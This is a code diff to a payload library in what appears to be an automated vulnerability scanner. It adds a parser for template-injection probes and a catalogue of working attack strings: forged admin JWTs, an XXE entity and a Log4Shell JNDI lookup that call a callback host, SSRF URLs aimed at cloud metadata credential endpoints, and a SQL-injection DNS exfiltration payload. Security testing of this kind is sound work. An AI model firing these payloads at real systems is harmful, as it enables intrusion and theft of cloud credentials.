@@ -125,6 +125,37 @@ class MissingSlotError(PayloadLibraryError):
 # replacement; every OTHER catalog ref is a vendored line-locator resolved by
 # reading its snapshot line (``_read_source_line``). Bulk corpus payloads are
 # static text, so they need no template — only the parameterized base slice does.
+_SSTI_ARITHMETIC = re.compile(
+    r"^\s*(?:(?:\{\{\s*(?P<brace_left>\d+)\s*(?P<brace_op>[+*])\s*(?P<brace_right>\d+)\s*\}\})|"
+    r"(?:<%=\s*(?P<erb_left>\d+)\s*(?P<erb_op>[+*])\s*(?P<erb_right>\d+)\s*%>)|"
+    r"(?:\$\{\s*(?P<dollar_left>\d+)\s*(?P<dollar_op>[+*])\s*(?P<dollar_right>\d+)\s*\})|"
+    r"(?:@\(\s*(?P<at_left>\d+)\s*(?P<at_op>[+*])\s*(?P<at_right>\d+)\s*\))|"
+    r"(?:#\{\s*(?P<hash_left>\d+)\s*(?P<hash_op>[+*])\s*(?P<hash_right>\d+)\s*\}))\s*$"
+)
+
+
+def expected_execution_output(value: str) -> str | None:
+    """Return safe expected output for simple arithmetic template probes.
+
+    This is metadata extraction, not template evaluation. Only digit/operator
+    expressions from the vendored SSTI fuzz corpus are accepted; arbitrary
+    template syntax and command-oriented expressions return ``None``.
+    """
+    match = _SSTI_ARITHMETIC.fullmatch(value)
+    if match is None:
+        return None
+    groups = match.groupdict()
+    for prefix in ("brace", "erb", "dollar", "at", "hash"):
+        left = groups[f"{prefix}_left"]
+        if left is None:
+            continue
+        right = groups[f"{prefix}_right"]
+        operator = groups[f"{prefix}_op"]
+        result = int(left) + int(right) if operator == "+" else int(left) * int(right)
+        return str(result)
+    return None
+
+
 _TEMPLATES: dict[str, str] = {
     "bola/object-id-substitution": "{object_id}",
     "idor/direct-object-reference-swap": "{object_id}",
@@ -133,6 +164,58 @@ _TEMPLATES: dict[str, str] = {
     "sqli/blind/oob-dns-exfil": r"'; EXEC master..xp_dirtree '\\{nonce}.{collab}\poc'-- -",
     "sqli/blind/timing-sleep-paired": "' AND SLEEP({sleep})-- -",
     "xss/reflected/script-tag-canary": "<script>{canary}</script>",
+    # JWT forgery (structural/authz, no injection sink). Every JWT segment is
+    # base64url — braces are not base64url characters, so a ``{object_id}`` slot
+    # inside an encoded segment would corrupt the token. These are therefore
+    # fully-formed precomputed tokens (no live slots): alg:none has an empty
+    # signature; weak-secret / key-confusion carry real HMAC-SHA256 signatures
+    # over ``header.payload`` with the canonical weak secret ``secret`` and the
+    # documented placeholder ``public_key`` respectively. Acceptance is decided
+    # by the STRUCTURAL JWT_FORGERY oracle (2xx vs 4xx), never by these strings.
+    "jwt_forgery/none-alg": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
+    "jwt_forgery/hs256-key-confusion": (
+        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.z3cU1wl_qNMB3_6Br3I7esH0TmClpmk6MbEtq9Q86-E"
+    ),
+    "jwt_forgery/weak-secret": (
+        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.GdYrDf_hp3IHBhv_b91SSCh7N2Lp19bHJXciDzy8C_c"
+    ),
+    # Blind OOB shapes — {nonce}/{collab} are the existing per-fire correlators
+    # (mint_fire_kit provides them); confirmation is the OOB_CALLBACK oracle
+    # (probe_nonce in observed_nonces). Literal braces survive targeted
+    # replacement: ``${jndi:ldap://…}`` and ``<!ENTITY …>`` are untouched.
+    "sqli_blind/oob-xxe-exfil": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{nonce}.{collab}/xxe">]>',
+    "command_injection/log4shell-oob": "${jndi:ldap://{nonce}.{collab}/a}",
+    # -- SSRF (Task 24) — hand-tagged, three families --------------------------
+    # Blind SSRF → OOB_CALLBACK: the server fetches a callback URL carrying the
+    # per-probe nonce ({nonce}.{collab}); confirmation is probe_nonce-in-observed.
+    # Non-blind SSRF → STRUCTURAL SSRF_RESPONSE: static cloud-metadata/internal
+    # URLs; confirmation is a known metadata response marker (sentinel) in the
+    # body. Cloud-metadata TOKEN entries → graph_edge_on_success derived_credential
+    # (the fetched response yields a credential, §8).
+    "ssrf/blind/http-callback": "http://{nonce}.{collab}/ssrf",
+    "ssrf/blind/http-callback-bare": "http://{nonce}.{collab}/",
+    "ssrf/blind/https-callback": "https://{nonce}.{collab}/ssrf",
+    "ssrf/blind/dns-only-callback": "http://{nonce}.{collab}/dns",
+    "ssrf/blind/file-scheme": "file://{nonce}.{collab}/etc/passwd",
+    "ssrf/blind/gopher-callback": "gopher://{nonce}.{collab}:70/_",
+    "ssrf/blind/redirect-chain-callback": "http://{nonce}.{collab}/redir?url=http://169.254.169.254/latest/meta-data/",
+    "ssrf/blind/internal-proxy-callback": "http://{nonce}.{collab}/?target=http://127.0.0.1/",
+    "ssrf/nonblind/aws-imds-meta": "http://169.254.169.254/latest/meta-data/",
+    "ssrf/nonblind/aws-imds-user-data": "http://169.254.169.254/latest/user-data/",
+    "ssrf/nonblind/aws-imds-instance-id": "http://169.254.169.254/latest/meta-data/instance-id",
+    "ssrf/nonblind/aws-imds-iam-roles": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "ssrf/nonblind/gcp-metadata": "http://metadata.google.internal/computeMetadata/v1/",
+    "ssrf/nonblind/azure-imds": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "ssrf/nonblind/alibaba-ecs-meta": "http://100.100.100.200/latest/meta-data/",
+    "ssrf/nonblind/digitalocean-meta": "http://169.254.169.254/metadata/v1/",
+    "ssrf/nonblind/openstack-meta": "http://169.254.169.254/openstack/latest/meta_data.json",
+    "ssrf/nonblind/kubernetes-api": "https://10.0.0.1/api/v1/namespaces/kube-system/",
+    "ssrf/nonblind/docker-socket": "http://127.0.0.1:2375/containers/json",
+    "ssrf/nonblind/internal-admin": "http://127.0.0.1/admin",
+    "ssrf/token/aws-imds-iam-role": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
+    "ssrf/token/gcp-service-account-token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "ssrf/token/azure-managed-identity-token": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
+    "ssrf/token/oob-aws-creds-callback": "http://{nonce}.{collab}/creds",
 }
 
 
@@ -197,6 +280,13 @@ def resolves(payload_ref: str) -> bool:
     if payload_ref in _TEMPLATES:
         return True
     try:
+        from reachagent.payloads.encoding import variant_value as _variant_value
+
+        if _variant_value(payload_ref) is not None:
+            return True
+    except Exception:  # noqa: BLE001, S110 — encoding cache unavailable
+        pass
+    try:
         return _read_source_line(payload_ref) is not None
     except UnknownPayloadRefError:
         return False
@@ -222,6 +312,14 @@ def resolve(payload_ref: str, **slots: object) -> str:
     :class:`MissingSlotError` for a required (default-less) template slot omitted.
     Deterministic: same inputs → same output.
     """
+    try:
+        from reachagent.payloads.encoding import variant_value as _variant_value2
+
+        vval = _variant_value2(payload_ref)
+        if vval is not None:
+            return vval
+    except Exception:  # noqa: BLE001, S110 — encoding cache unavailable
+        pass
     template = _TEMPLATES.get(payload_ref)
     if template is not None:
         return _fill_template(payload_ref, template, slots)
@@ -270,7 +368,12 @@ def _read_source_line(payload_ref: str) -> str | None:
         raise UnknownPayloadRefError(
             f"line-locator ref {payload_ref!r} names unknown source {source!r}"
         )
-    path = root / match.group("relpath")
+    path = (root / match.group("relpath")).resolve()
+    root = root.resolve()
+    if path != root and root not in path.parents:
+        raise UnknownPayloadRefError(
+            f"line-locator ref {payload_ref!r}: path escapes vendored snapshot"
+        )
     if not path.is_file():
         raise UnknownPayloadRefError(f"line-locator ref {payload_ref!r}: no vendored file {path}")
     line_no = int(match.group("line"))
